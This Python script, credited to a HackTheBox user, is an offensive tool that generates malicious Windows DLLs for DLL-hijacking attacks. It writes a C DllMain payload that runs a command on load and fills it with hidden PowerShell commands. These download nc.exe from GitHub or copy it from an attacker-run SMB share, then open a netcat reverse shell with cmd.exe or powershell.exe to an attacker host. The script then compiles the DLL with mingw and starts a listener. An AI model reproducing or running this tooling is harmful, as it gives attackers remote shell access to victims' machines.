#!/usr/bin/env python3

import os
import subprocess
import re
import time
import random
import string
from termcolor import colored

# Author: J3wker
# HTB Profile: https://www.hackthebox.eu/home/users/profile/165824
# GitHub: https://github.com/J3wker/PToolity
# SMB Server script credits goes to SecureAuthCorp - Impacket
x = """
      __         ___  _____          _                   __  
     / /        |_  ||____ |        | |                  \ \ 
    / /_____      | |    / /_      _| | _____ _ __   _____\ \ 
   < <______|     | |    \ \ \ /\ / / |/ / _ \ '__| |______> > 
    \ \       /\__/ /.___/ /\ V  V /|   <  __/ |          / /     
     \_\      \____/ \____/  \_/\_/ |_|\_\___|_|         /_/                                                                                       
   """
def creds():
    print(x)
    print(colored("Malicious DLL generator for DLL hijacking", 'blue'))
    print(colored("---------------------\n", 'green'))
    print(colored("Author: J3wker", 'red'))
    print(colored("HTB Profile: https://www.hackthebox.eu/profile/165824", 'green'))
    print(colored("GitHub: https://github.com/J3wker/PToolity\n\n", 'green'))


def check_dep():
    # checking if compiler installed

    x64_check = subprocess.check_output("x86_64-w64-mingw32-gcc", shell=True)
    if "no input files" not in x64_check:
        os.system("apt install mingw-w64")
    x32_check = subprocess.check_output("i686-w64-mingw32-gcc", shell=True)
    if "no input files" not in x32_check:
        os.system("apt install mingw-w64")


def read_payload():
    # The source code of the C payload
    evpay = """
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("malicouscontent");
        ExitProcess(0);
    }
    return TRUE;
}
"""
    return evpay


def create_ready(ready, name):
    # Writing the ready files
    name = name + ".c"
    try:
        with open("/etc/DLLicous/"+name, 'w') as last:
            last.write(ready)
    except FileNotFoundError:     # If folder doesn't exist it creates it
        os.mkdir("/etc/DLLicous")
        os.mkdir("/etc/DLLicous/output/")


def generate():
    print("Enter '1' for Custom System Command in the DLL payload")
    print("Enter '2' to Create an NC Reverse Shell Payload" + colored(" -- (Works Best!!)", "green"))
    print("Enter '3' for SMB transfer payload (Only works in lan)")
    choice = input("Attack choice -> ")
    print("Which OS are you targeting ? " + colored(" Type: 'win7' or 'other'", "blue"))
    ver = input(colored("[+] Target OS - > ", "red"))
    if "1" in choice:            # Custom Commmands Option
        get_payload = read_payload()
        print(colored("make sure you use Double Backslashs !!!", "red"))
        print("\nExample: C:\\\\Windows\\\\System32\n")
        evil = input("Enter Evil Command - > ")
        payload = re.sub('".+"', '"' + evil + '"', get_payload)    # Using Regex to change the base Source Code
    if "2" in choice:
        get_payload = read_payload()
        LHOST = input("LHOST - > ")
        LPORT = input("LPORT - > ")
        if "other" in ver:
            evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe"   )   # The Evil Payload
        if "win7" in ver:
            evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e cmd.exe"   )   # The Evil Payload
        payload = re.sub('".+"', '"' + evil + '"', get_payload)
    if "3" in choice:
        print(colored("\n[+] Opening SMB server and netcat for delivery !\n", "red"))   # Opening SecureAuthCorp - impacket-smbserver.py
        time.sleep(2)
        os.system("wget https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -O /tmp/nc.exe")      # Downloading Netcat for windows and places it in the /tmp directory
        os.popen("gnome-terminal -- bash -c 'python3 /usr/share/python-impacket/smbserver.py hacking /tmp/ -smb2support'")   # Launching an SMB server with smb2support on /tmp/ Directory
        get_payload = read_payload()
        LHOST = input("LHOST - > ")
        LPORT = input("LPORT - > ")
        if "other" in ver:
            evil = (f"powershell -windowstyle hidden copy \\\\\\\{LHOST}\\\hacking\\\\nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe")   # Payload in the DLL that copy's the nc.exe file and executes a reverse shell
        if "win7" in ver:
            evil = (f"powershell -windowstyle hidden copy \\\\\\\{LHOST}\\\hacking\\\\nc.exe & nc.exe {LHOST} {LPORT} -e cmd.exe")   # Payload in the DLL that copy's the nc.exe file and executes a reverse shell
        payload = get_payload.replace("malicouscontent", evil)   # Due to regex having troubles with \\ I used .replace instead

    return [payload, LPORT]


def complie(DLL, output):
    print("'x64' for 64bit executables ")
    print("'x86' for 32bit executables ")
    bit = input("[+] Which operating system are you targeting: ")
    if "x64" in bit:
        os.system(f"x86_64-w64-mingw32-gcc /etc/DLLicous/{DLL} -shared -o /etc/DLLicous/output/{output}")    # Compiling a 64bit DLL
    if "x86" in bit:
        os.system(f"i686-w64-mingw32-gcc /etc/DLLicous/{DLL} -shared -o /etc/DLLicous/output/{output}")     # Compiling a 32bit DLL


def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))   # Random String is used here to make random C files


def start_listner(port):
    # This Function is for ease of use start for you a listener of a port you want
    print(colored("enter: y/N", 'green'))
    listen = input(colored(f"Do you want to start a netcat listener? -> ", 'blue'))
    if "y" in listen:
        # port = input(colored("Port num - > ", 'red'))
        os.popen(f"gnome-terminal -- bash -c 'nc -lnvp {port}'")   # Port is chosen here.


# Script Run 
try:
    creds()
    malicous = generate()
    temp_name = randomString(10)
    create_ready(malicous[0], temp_name)
    print(colored("\n          [+] Generating  Malicous .c file", 'red'))
    time.sleep(2)
    output = input("\nEnter the DLL output name - > ")
    if ".dll" not in output:
        output = output + ".dll"

    temp_name = temp_name + ".c"
    complie(temp_name, output)
    print("\nMalicious source c is at: " + colored(f"/etc/DLLicous/{temp_name}\n", 'green'))
    print("\nMalicious DLL is at: " + colored(f"/etc/DLLicous/output/{output}\n", 'green'))
    start_listner(malicous[1])
except KeyboardInterrupt:
    print(colored("\n\n[+] Program Existed", 'red'))
